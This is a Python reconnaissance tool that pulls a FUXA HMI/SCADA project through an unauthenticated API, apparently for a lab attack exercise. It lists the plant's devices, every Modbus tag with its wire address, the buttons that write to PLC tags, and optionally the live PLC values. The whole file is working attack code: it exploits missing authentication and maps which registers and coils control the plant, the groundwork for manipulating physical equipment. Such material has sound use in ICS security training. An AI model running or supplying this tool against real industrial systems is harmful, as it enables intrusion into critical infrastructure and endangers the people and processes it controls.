#!/usr/bin/env python3
"""
HMI Project Recon: map the plant from FUXA's project, without a login.

Downloads GET /api/project from FUXA and prints
  - the devices FUXA talks to (name, protocol, address),
  - every tag with FUXA's address and the address on the wire,
  - the views, and which button writes which tag,
  - with --live, the current value of every PLC tag read through FUXA's own
    /api/getTagValue (no Modbus connection of your own).

Only reads. Standard library only, so it runs in the attack shell as is.

    python3 hmi_recon.py                       # FUXA at 172.18.0.4:1881
    python3 hmi_recon.py --live
    python3 hmi_recon.py --save project.json   # keep the raw file
"""
import argparse
import json
import sys
import urllib.parse
import urllib.request

# FUXA's Modbus areas (tag "memaddress") and what they are called in Modbus.
AREAS = {
    "000000": "coil",
    "100000": "discrete input",
    "300000": "input register",
    "400000": "holding register",
}
# Click actions that change a tag (FUXA 1.2.6 event action names).
WRITE_ACTIONS = {"onToggleValue", "onSetValue", "onSetInput"}


def get_json(url, timeout=10):
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def wire_address(tag):
    """FUXA numbers Modbus addresses from 1; the request on the wire from 0."""
    try:
        return int(tag.get("address")) - 1
    except (TypeError, ValueError):
        return None


def tag_index(project):
    """tag id -> (device name, tag)."""
    index = {}
    for device in project.get("devices", {}).values():
        for tag in (device.get("tags") or {}).values():
            index[tag["id"]] = (device.get("name"), tag)
    return index


def print_devices(project):
    print("== Devices")
    for device in project.get("devices", {}).values():
        prop = device.get("property") or {}
        print(f"  {device.get('name')!s:<14} {device.get('type')!s:<12} "
              f"address={prop.get('address')!s:<16} id={device.get('id')}")


def print_tags(project):
    print("\n== Tags (FUXA address -> Modbus address on the wire)")
    print(f"  {'device':<12} {'tag':<26} {'area':<17} {'FUXA':>5} {'wire':>5}  tag id")
    for device in project.get("devices", {}).values():
        for tag in (device.get("tags") or {}).values():
            area = AREAS.get(str(tag.get("memaddress")))
            wire = wire_address(tag) if area else None
            print(f"  {device.get('name')!s:<12} {tag.get('name')!s:<26} {area or '-':<17} "
                  f"{tag.get('address') or '-':>5} {wire if wire is not None else '-':>5}  {tag['id']}")


def button_writes(project):
    """(view, button text, action, tag id) for every click that changes a tag."""
    found = []
    for view in project.get("hmi", {}).get("views", []):
        for item in (view.get("items") or {}).values():
            prop = item.get("property") or {}
            for event in prop.get("events") or []:
                if event.get("type") != "click" or event.get("action") not in WRITE_ACTIONS:
                    continue
                options = event.get("actoptions") or {}
                variable = options.get("variable") or {}
                tag_id = variable.get("variableId") or options.get("variableId") or prop.get("variableId")
                text = prop.get("text")
                if not text or text == "HtmlButton":  # FUXA's default caption
                    text = item.get("name")
                found.append((view.get("name"), text, event.get("action"), tag_id))
    return found


def print_views(project):
    start = project.get("hmi", {}).get("layout", {}).get("start")
    print("\n== Views")
    for view in project.get("hmi", {}).get("views", []):
        note = "start view" if view.get("id") == start else ""
        print(f"  {view.get('name')!s:<14} {len(view.get('items') or {}):>3} items  {note}")

    index = tag_index(project)
    print("\n== Buttons that write to the plant")
    for view, text, action, tag_id in button_writes(project):
        device, tag = index.get(tag_id, ("?", {"name": tag_id}))
        area = AREAS.get(str(tag.get("memaddress")), "?")
        wire = wire_address(tag)
        print(f"  {view!s:<12} {text!s:<22} {action:<14} -> {device}/{tag.get('name')} "
              f"({area} {wire if wire is not None else '?'})")


def print_live(base, project):
    ids = [tag_id for tag_id, (device, _) in tag_index(project).items() if device != "FUXA Server"]
    query = urllib.parse.urlencode({"ids": json.dumps(ids)})
    values = {v["id"]: v.get("value") for v in get_json(f"{base}/api/getTagValue?{query}")}
    print("\n== Live values through FUXA's /api/getTagValue")
    for tag_id in ids:
        print(f"  {tag_index(project)[tag_id][1].get('name')!s:<14} {values.get(tag_id)}")


def main():
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--host", default="172.18.0.4", help="FUXA host (default 172.18.0.4)")
    parser.add_argument("--port", type=int, default=1881, help="FUXA port (default 1881)")
    parser.add_argument("--live", action="store_true", help="also read the current tag values")
    parser.add_argument("--save", metavar="FILE", help="write the raw project to FILE")
    args = parser.parse_args()

    base = f"http://{args.host}:{args.port}"
    try:
        project = get_json(f"{base}/api/project")
    except OSError as error:
        sys.exit(f"Cannot download {base}/api/project: {error}")
    if args.save:
        with open(args.save, "w", encoding="utf-8") as f:
            json.dump(project, f, indent=2)
        print(f"Saved the project to {args.save}\n")

    print_devices(project)
    print_tags(project)
    print_views(project)
    if args.live:
        print_live(base, project)


if __name__ == "__main__":
    main()
